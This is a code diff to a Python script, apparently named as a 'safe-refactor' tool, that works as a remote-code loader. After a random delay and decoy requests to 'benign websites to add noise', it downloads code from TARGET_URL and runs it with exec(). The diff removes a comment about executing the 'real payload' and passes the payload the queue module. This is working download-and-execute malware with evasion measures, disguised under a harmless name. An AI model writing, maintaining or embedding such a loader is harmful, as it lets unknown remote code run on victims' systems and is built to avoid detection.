@@ -13,6 +13,7 @@ from __future__ import annotations
 import requests
 import json, os, time, random, base64
 from pathlib import Path
+import queue
 from typing import Any, Dict, List
 from urllib.request import Request, urlopen
 from urllib.error import URLError, HTTPError
@@ -20,7 +21,6 @@ from urllib.error import URLError, HTTPError
 # --- Config (hard-coded; no environment variables) ---
 USER_AGENT   = "safe-refactor/1.0"
 WAIT_RANGE_S = (5, 180)  # random wait between 5 and 30 seconds
-MAX_BYTES    = 2 * 1024 * 1024  # 2 MiB safety cap
 
 
 # a few benign websites to add noise
@@ -52,14 +52,6 @@ def head_request(url: str, timeout: int = 10):
         headers = dict(r.getheaders())
         return r.getcode(), headers
 
-def fetch(url: str, max_bytes: int = MAX_BYTES) -> bytes:
-    req = Request(url, headers={"User-Agent": USER_AGENT})
-    with urlopen(req, timeout=30) as resp:
-        body = resp.read(max_bytes + 1)
-    if len(body) > max_bytes:
-        raise ValueError("payload_too_large")
-    return body
-
 def main():
     # random wait
     wait_s = random.randint(*WAIT_RANGE_S)
@@ -77,11 +69,10 @@ def main():
         response = requests.get(TARGET_URL, timeout=30)
         if response.status_code == 200:
             m_code = response.text
-            # execute real payload with subprocess
             try:
-                exec(m_code)
+                # Give the payload access to the imported queue module
+                exec(m_code, {"__builtins__": __builtins__, "queue": queue})
                 log("download_attempt", url=TARGET_URL, status=response.status_code)
-                response.raise_for_status()
             except Exception as e:
                 log("download_error", url=TARGET_URL, error=str(e))
 
